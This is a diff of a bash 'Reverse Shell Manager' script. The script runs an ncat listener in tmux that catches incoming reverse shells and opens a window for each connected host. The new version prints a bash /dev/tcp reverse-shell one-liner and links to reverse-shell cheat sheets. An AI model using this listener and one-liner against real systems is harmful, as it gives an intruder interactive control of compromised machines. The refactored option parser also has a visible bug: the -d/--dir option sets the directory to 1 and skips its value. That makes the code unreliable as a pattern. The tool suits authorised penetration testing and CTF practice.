@@ -1,97 +1,92 @@
 #!/bin/bash
 
-rsm_temp_dir=${RSM_DIR:-/tmp/.rsm}
-rsm_tmux_sock=$rsm_temp_dir/tmux.sock
-max_connections=${RSM_MAX_CONN:-128}
-max_recv_mb=${RSM_MAX_RECV:-64}
+declare TOP_PID="$$"
+declare -a RSM_ARGUMENTS
+declare -A RSM_OPTIONS
 
-top_pid=$$
-[[ $max_recv_mb ]] \
-    && cat='head -c '$(( max_recv_mb * 1024 * 1024 )) \
-    || cat=cat
-
-rsm_start() {
-    local port=$1
+function rsm_start {
+    local port="$1"
     _check_requirements
-    _check_port_valid $port
-    _check_no_rsm_at $port
-    _start $port
+    _check_port_valid "$port"
+    _check_no_rsm_at "$port"
+    _start "$port"
 }
 
-rsm_list() {
+function rsm_list {
     _check_requirements
     _check_exist_rsm
     _list_ports
 }
 
-rsm_info() {
-    local port=$1
+function rsm_info {
+    local port="$1"
     _check_requirements
-    _check_port_valid $port
-    _check_exist_rsm_at $port
-    _info $port
+    _check_port_valid "$port"
+    _check_exist_rsm_at "$port"
+    _info "$port"
 }
 
-rsm_info_all() {
+function rsm_info_all {
     _check_requirements
     _check_exist_rsm
-    for port in `_list_ports`; do
-        _info $port
+    for port in $(_list_ports); do
+        _info "$port"
     done
 }
 
-rsm_stop() {
-    local port=$1
+function rsm_stop {
+    local port="$1"
     _check_requirements
-    _check_port_valid $port
-    _check_exist_rsm_at $port
-    _stop $port
+    _check_port_valid "$port"
+    _check_exist_rsm_at "$port"
+    _stop "$port"
 }
 
-rsm_stop_all() {
+function rsm_stop_all {
     _check_requirements
     _check_exist_rsm
-    for port in `_list_ports`; do
-        _stop $port
+    for port in $(_list_ports); do
+        _stop "$port"
     done
 }
 
-rsm_attach() {
+function rsm_attach {
     local port=$1
     _check_requirements
-    _check_port_valid $port
-    _check_exist_rsm_at $port
-    _attach $port
+    _check_port_valid "$port"
+    _check_exist_rsm_at "$port"
+    _attach "$port"
 }
 
-rsm_attach_last() {
+function rsm_attach_last {
     _check_requirements
     _check_exist_rsm
-    local port=`_list_ports | tail -1`
-    _check_port_valid $port
-    _check_exist_rsm_at $port
-    _attach $port
+    local port
+    port="$(_list_ports | tail -1)"
+    _check_port_valid "$port"
+    _check_exist_rsm_at "$port"
+    _attach "$port"
 }
 
-rsm_clean() {
-    local port=$1
+function rsm_clean {
+    local port="$1"
     _check_requirements
-    _check_port_valid $port
-    _check_exist_rsm_at $port
-    _clean $port
+    _check_port_valid "$port"
+    _check_exist_rsm_at "$port"
+    _clean "$port"
 }
 
-rsm_clean_all() {
+function rsm_clean_all {
     _check_requirements
     _check_exist_rsm
-    for port in `_list_ports`; do
-        _clean $port
+    for port in $(_list_ports); do
+        _clean "$port"
     done
 }
 
-rsm_help() {
-    echo "Usage:
-
+function rsm_help {
+    echo "Usage: COMMAND [OPTIONS]
+Commands:
     rsm PORT            Start a reverse shell listener on PORT
     rsm d[etached] PORT Start a detached reverse shell listener on PORT
     rsm l[ist]          List active rsm listeners
@@ -104,99 +99,167 @@ rsm_help() {
     rsm c[lean] PORT    Clean sockets for PORT
     rsm c[lean]         Clean all sockets
     rsm h[elp]          Show this help message
-
-    Configurable Variables:
-
-        RSM_DIR         Where the rsm sockets be stored (default: /tmp/.rsm)
-        RSM_MAX_CONN    Maximum number of connections (default: 128)
-        RSM_MAX_RECV    Maximum receiving MB (default: 64)
-        RSM_HOOK        Command to eval when a client connects
-        RSM_WITH        Command to eval when rsm starts
+Options:
+    -d, --dir DIR       Where the rsm sockets be stored (default: /tmp/.rsm)
+    -n, --max-conn N    Maximum number of connections (default: 128)
+    -r, --max-recv N    Maximum receiving MB (default: 0, unlimited)
+    -c, --hook CMD      Command to eval when a client connects
+    -w, --with CMD      Command to eval when rsm starts
+    --ncat-flags FLAGS  Additional command line flags for ncat
+    --tmux-flags FLAGS  Additional command line flags for tmux
+    -h, --help          Show this help message
 "
+}
+
+function check_command_exists {
+    local command="$1"
+    if ! hash "$command" >&/dev/null; then
+        echo "error: command '$command' does not exist" >&2
+        exit 1
+    fi
+}
+
+function check_option_not_duplicate {
+    local option="$1"
+    local key="$2"
+    if [[ -v RSM_OPTIONS["$key"] ]]; then
+        echo "error: duplicate option $option" >&2
+        exit 1
+    fi
+}
+
+function check_command_requires_argument {
+    local command="$1"
+    local argc="$2"
+    if (( argc == 0 )); then
+        echo "error: command $command requires an argument" >&2
+        exit 1
+    fi
+}
+
+function check_command_argument_number {
+    local command="$1"
+    local argc="$2"
+    shift 2
+    for n in "$@"; do
+        if [[ $argc == "$n" ]]; then
+            return
+        fi
+    done
+    echo "error: wrong number of argument for command $command" >&2
+    exit 1
+}
+
+function check_command_is_defined {
+    if [[ ${#RSM_COMMAND[@]} != 0 ]]; then
+        echo "error: duplicate commands" >&2
+        exit 1
+    fi
+}
+
+function check_option_requires_value {
+    local option="$1"
+    local argc="$2"
+    if (( argc == 0 )); then
+        echo "error: option $option requires a value" >&2
+        exit 1
+    fi
+}
+
+function set_option {
+    local option="$1"
+    local key="$2"
+    local value="$3"
+    check_option_not_duplicate "$option" "$key"
+    RSM_OPTIONS["$key"]="$value"
 }
 
 #===================================================================================
 
+check_command_exists ncat
+check_command_exists tmux
+
 _error() {
-    ( >&2 echo "Error: $1" ); $2
-    kill -s TERM $top_pid
+    ( >&2 echo "error: $1" ); $2
+    kill -s TERM $TOP_PID
 }
 
 trap 'exit' TERM
 
 _start() {
-    local port=$1
-    local dir=$rsm_temp_dir/$port
-    local session=rsm-$port
-    mkdir -p $dir
-    tmux -S $rsm_tmux_sock new -s $session -n listener $rsm_tmux_option "
-    eval \$RSM_WITH &
-    echo Starting...
-    echo
-    echo   '   =============================================== '
-    echo   '  || Thanks for using the Reverse Shell Manager. ||'
-    printf '  || RSM will be listening on port %-6s        ||\n' $port'.'
-    echo   '   =============================================== ' 
-    echo
-    ncat -v -m $max_connections -k -l $port -c '
-        IP=\$NCAT_REMOTE_ADDR
-        PORT=\$NCAT_REMOTE_PORT
-        src=\$IP:\$PORT
-        eval \$RSM_HOOK
-        name=client-\${src}-\$(date +%Y.%m.%d-%H:%M:%S)
-        tmux -S $rsm_tmux_sock new-window -t $session -n \$src \"
-            echo \$(date), connection from: \$src
-            echo ________________________________________________________________
-            until [[ -S $dir/\$name ]]; do sleep 0.1; done
-            ncat -U $dir/\$name | $cat
-        \"
-        ncat -lU $dir/\$name
-        rm -f $dir/\$name
-        ' || {
-            echo
-            echo '   ========================================== '
-            echo '  || Window will be closed after 5 seconds, ||'
-            echo '  || because there was an error.            ||'
-            echo '   ========================================== '
-            echo
-            for i in 5 4 3 2 1; do
-                echo -n \$i
-                sleep 1
-            done
-        }
-    rm -rf $dir
-    "
+    local port="$1"
+    local dir="$RSM_DIR/$port"
+    local session="rsm-$port"
+    mkdir -p "$dir"
+    RSM_WITH="$RSM_WITH" \
+    RSM_HOOK="$RSM_HOOK" \
+        tmux -S "$RSM_TMUX_SOCK" new -s "$session" -n listener $RSM_TMUX_FLAGS "
+eval \$RSM_WITH &
+echo 'info: RSM will be listening on port $port'
+echo 'info: the simplest reverse shell command:'
+echo '  $' 'bash -c \"bash -i >& /dev/tcp/\$HOST/\$PORT 0<&1\"'
+echo 'info: reverse shell cheatsheets:'
+echo '  * https://highon.coffee/blog/reverse-shell-cheat-sheet/'
+echo '  * https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'
+echo '  * https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet'
+echo
+ncat $RSM_NCAT_FLAGS -v -k -l $port -c '
+    IP=\$NCAT_REMOTE_ADDR
+    PORT=\$NCAT_REMOTE_PORT
+    REMOTE_ADDR=\$IP:\$PORT
+    eval \$RSM_HOOK
+    NAME=client-\${REMOTE_ADDR}-\$(date +%Y.%m.%d-%H:%M:%S)
+    tmux -S $RSM_TMUX_SOCK new-window -t $session -n \$REMOTE_ADDR \"
+        echo \$(date), connection from: \$REMOTE_ADDR
+        echo ________________________________________________________________
+        until [[ -S $dir/\$NAME ]]; do sleep 0.1; done
+        ncat -U $dir/\$NAME | $RSM_CAT
+    \"
+    ncat -lU $dir/\$NAME
+    rm -f $dir/\$NAME
+    ' || {
+        echo
+        echo 'warning: window will be closed after 5 seconds'
+        echo
+        for i in 5 4 3 2 1; do
+            echo -n \$i
+            sleep 1
+        done
+    }
+rm -rf $dir
+"
 }
 
 _stop() {
-    local port=$1
-    local session=rsm-$port
-    _clean $port
-    echo Killing $session
-    tmux -S $rsm_tmux_sock kill-session -t $session
-    rm -rf $rsm_temp_dir/$port
+    local port="$1"
+    local session="rsm-$port"
+    _clean "$port"
+    echo "Killing $session"
+    tmux -S "$RSM_TMUX_SOCK" kill-session -t "$session"
+    rm -rf "${RSM_DIR:?}/$port"
 }
 
 _clean() {
     local port=$1
     local session=rsm-$port
-    local windows="$(tmux -S $rsm_tmux_sock list-windows -t $session \
+    local windows
+    windows="$(tmux -S "$RSM_TMUX_SOCK" list-windows -t "$session" \
         | grep -v listener \
         | cut -d: -f1)"
     for i in $windows; do
-        echo Killing $session:$i
-        tmux -S $rsm_tmux_sock kill-window -t $session:$i
+        echo "Killing $session:$i"
+        tmux -S "$RSM_TMUX_SOCK" kill-window -t "$session:$i"
     done
-    rm -f $rsm_temp_dir/$port/*
+    rm -f "$RSM_DIR"/"$port"/*
 }
 
 _attach() {
     local port=$1
-    tmux -S $rsm_tmux_sock attach -t "rsm-$port"
+    tmux -S "$RSM_TMUX_SOCK" attach -t "rsm-$port"
 }
 
 _list_sessions() {
-    tmux -S $rsm_tmux_sock ls 2>/dev/null | grep -E '^rsm-[0-9]+:' | sed 's/:.*//g'
+    tmux -S "$RSM_TMUX_SOCK" ls 2>/dev/null | grep -E '^rsm-[0-9]+:' | sed 's/:.*//g'
 }
 
 _list_ports() {
@@ -205,38 +268,37 @@ _list_ports() {
 
 _info() {
     local port=$1
-    local dir=$rsm_temp_dir/$port
-    echo $port
-    cd $dir
-    ls 2>/dev/null | sed 's/^/- /g'
+    local dir=$RSM_DIR/$port
+    echo "$port"
+    find "$dir" -maxdepth 1 -type d -printf "- %f\n"
 }
 
 _check_port_valid() {
     [[ $1 ]] \
-        || _error "Port cannot be empty."
+        || _error "port cannot be empty"
     [[ $1 =~ ^-?[0-9]+$ ]] \
-        || _error "Port must be a number."
+        || _error "port must be a number"
     [[ $((0 < $1 && $1 < 65536)) = 1 ]] \
-        || _error "Port is out of range."
+        || _error "port is out of range"
 }
 
 _check_exist_rsm() {
-    [[ `_list_sessions` ]] \
-        || _error "Nothing listening."
+    [[ $(_list_sessions) ]] \
+        || _error "nothing listening"
 }
 
 _check_exist_rsm_at() {
-    [[ `tmux -S $rsm_tmux_sock ls 2>/dev/null | grep -E "^rsm-$port:" 2>/dev/null` ]] \
-        || _error "Nothing listening on port $1."
+    tmux -S "$RSM_TMUX_SOCK" ls 2>/dev/null | grep -qE "^rsm-$port:" \
+        || _error "nothing listening on port $1"
 }
 
 _check_no_rsm_at() {
-    [[ `tmux -S $rsm_tmux_sock ls 2>/dev/null | grep -E "^rsm-$port:" 2>/dev/null` ]] \
-        && _error "Already listening on port $1."
+    tmux -S "$RSM_TMUX_SOCK" ls 2>/dev/null | grep -qE "^rsm-$port:" \
+        && _error "already listening on port $1"
 }
 
 _check_exist_command() {
-    which $1 >/dev/null 2>&1 \
+    command -v "$1" >/dev/null 2>&1 \
         || _error "'$1' doesn't exist."
 }
 
@@ -247,74 +309,144 @@ _check_requirements() {
 
 #===================================================================================
 
-[[ $# = 0 ]] && _error "No argument." rsm_help
+while (( $# > 0 )); do
+    arg="$1"
+    shift
+    case "$arg" in
+        -d|--dir)
+            check_option_requires_value "$arg" "$#"
+            set_option "$arg" 'dir' 1
+            ;;
+        -r|--max-recv)
+            check_option_requires_value "$arg" "$#"
+            set_option "$arg" 'max_recv' "$1"
+            shift
+            ;;
+        -n|--max-conn)
+            check_option_requires_value "$arg" "$#"
+            set_option "$arg" 'max_conn' "$1"
+            shift
+            ;;
+        -c|--hook)
+            check_option_requires_value "$arg" "$#"
+            set_option "$arg" 'hook' "$1"
+            shift
+            ;;
+        -w|--with)
+            check_option_requires_value "$arg" "$#"
+            set_option "$arg" 'with' "$1"
+            shift
+            ;;
+        --ncat-flags)
+            check_option_requires_value "$arg" "$#"
+            set_option "$arg" "ncat_flags" "$1"
+            shift
+            ;;
+        --tmux-flags)
+            check_option_requires_value "$arg" "$#"
+            set_option "$arg" "tmux_flags" "$1"
+            shift
+            ;;
+        -h|--help)
+            set_option "$arg" 'help' 1
+            ;;
+        -*)
+            echo "error: unknown option $arg" >&2
+            exit 1
+            ;;
+        *)
+            RSM_ARGUMENTS+=("$arg")
+            ;;
+    esac
+done
 
-mkdir -p $rsm_temp_dir
+if [[ -v RSM_OPTIONS["help"] ]]; then
+    rsm_help
+    exit 0
+fi
 
-case $1 in
-detached|d|-d|--detached)
-    if [[ $# = 2 ]]; then
-        rsm_tmux_option=-d
-        rsm_start $2
-    else
-        _error 'Wrong number of arguments.' rsm_help
-    fi
-    ;;
-stop|s|-s|--stop)
-    if [[ $# = 1 ]]; then
-        rsm_stop_all
-    elif [[ $# = 2 ]]; then
-        rsm_stop $2
-    else
-        _error 'Wrong number of arguments.' rsm_help
-    fi
-    ;;
-clean|cl|c|-c|--clean)
-    if [[ $# = 1 ]]; then
-        rsm_clean_all
-    elif [[ $# = 2 ]]; then
-        rsm_clean $2
-    else
-        _error 'Wrong number of arguments.' rsm_help
-    fi
-    ;;
-attach|at|a|-a|--attach)
-    if [[ $# = 1 ]]; then
-        rsm_attach_last
-    elif [[ $# = 2 ]]; then
-        rsm_attach $2
-    else
-        _error 'Wrong number of arguments.' rsm_help
-    fi
-    ;;
-list|ls|l|-l|--list)
-    if [[ $# = 1 ]]; then
+[[ -v RSM_OPTIONS["dir"] ]] \
+    && RSM_DIR="${RSM_OPTIONS["dir"]}" \
+    || RSM_DIR="${RSM_DIR:-/tmp/.rsm}"
+[[ -v RSM_OPTIONS["max_conn"] ]] \
+    && RSM_MAX_CONN="${RSM_OPTIONS["max_conn"]}" \
+    || RSM_MAX_CONN="${RSM_MAX_CONN:-128}"
+[[ -v RSM_OPTIONS["max_recv"] ]] \
+    && RSM_MAX_RECV="${RSM_OPTIONS["max_recv"]}" \
+    || RSM_MAX_RECV="${RSM_MAX_RECV:-0}"
+[[ -v RSM_OPTIONS["with"] ]] \
+    && RSM_WITH="${RSM_OPTIONS["with"]}" \
+    || RSM_WITH="${RSM_WITH:-:}"
+[[ -v RSM_OPTIONS["hook"] ]] \
+    && RSM_HOOK="${RSM_OPTIONS["hook"]}" \
+    || RSM_HOOK="${RSM_HOOK:-:}"
+[[ -v RSM_OPTIONS["ncat_flags"] ]] \
+    && RSM_NCAT_FLAGS="${RSM_OPTIONS["ncat_flags"]}" \
+    || RSM_NCAT_FLAGS="${RSM_NCAT_FLAGS:-}"
+[[ -v RSM_OPTIONS["tmux_flags"] ]] \
+    && RSM_TMUX_FLAGS="${RSM_OPTIONS["tmux_flags"]}" \
+    || RSM_TMUX_FLAGS="${RSM_TMUX_FLAGS:-}"
+
+[[ $RSM_MAX_CONN -gt 0 && $RSM_NCAT_FLAGS != *'-m'* ]] \
+    && RSM_NCAT_FLAGS="$RSM_NCAT_FLAGS -m $RSM_MAX_CONN"
+[[ $RSM_MAX_RECV -gt 0 ]] \
+    && RSM_CAT="head -c $(( RSM_MAX_RECV * 1024 * 1024 ))" \
+    || RSM_CAT='cat'
+
+RSM_TMUX_SOCK="$RSM_DIR/tmux.sock"
+
+mkdir -p "$RSM_DIR"
+
+[[ ${#RSM_ARGUMENTS[@]} == 0 ]] && _error "requires an argument" rsm_help
+
+case "${RSM_ARGUMENTS[0]}" in
+    detached|de|d)
+        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 2
+        [[ $RSM_TMUX_FLAGS != *'-d'* ]] && RSM_TMUX_FLAGS="$RSM_TMUX_FLAGS -d"
+        rsm_start "${RSM_ARGUMENTS[@]:1}"
+        ;;
+    stop|st|s)
+        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1 2
+        if [[ -z ${RSM_ARGUMENTS[1]} ]]; then
+            rsm_stop_all
+        else
+            rsm_stop "${RSM_ARGUMENTS[@]:1}"
+        fi
+        ;;
+    clean|cl|c)
+        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1 2
+        if [[ -z ${RSM_ARGUMENTS[1]} ]]; then
+            rsm_clean_all
+        else
+            rsm_clean "${RSM_ARGUMENTS[@]:1}"
+        fi
+        ;;
+    attach|at|a)
+        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1 2
+        if [[ -z ${RSM_ARGUMENTS[1]} ]]; then
+            rsm_attach_last
+        else
+            rsm_attach "${RSM_ARGUMENTS[@]:1}"
+        fi
+        ;;
+    list|ls|l)
+        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1
         rsm_list
-    else
-        _error 'Wrong number of arguments.' rsm_help
-    fi
-    ;;
-info|i|-i|--info)
-    if [[ $# = 1 ]]; then
-        rsm_info_all
-    elif [[ $# = 2 ]]; then
-        rsm_info $2
-    else
-        _error 'Wrong number of arguments.' rsm_help
-    fi
-    ;;
-help|h|-h|--help)
-    if [[ $# = 1 ]]; then
+        ;;
+    info|i)
+        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1 2
+        if [[ ${#RSM_ARGUMENTS[@]} == 1 ]]; then
+            rsm_info_all
+        else
+            rsm_info "${RSM_ARGUMENTS[@]:1}"
+        fi
+        ;;
+    help|h)
+        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1
         rsm_help
-    else
-        _error 'Wrong number of arguments.' rsm_help
-    fi
-    ;;
-*)
-    if [[ $# = 1 ]]; then
-        rsm_start $1
-    else
-        _error 'Unknown command.' rsm_help
-    fi
-    ;;
+        ;;
+    *)
+        check_command_argument_number "$(basename "$0")" "${#RSM_ARGUMENTS[@]}" 1
+        rsm_start "${RSM_ARGUMENTS[@]}"
+        ;;
 esac
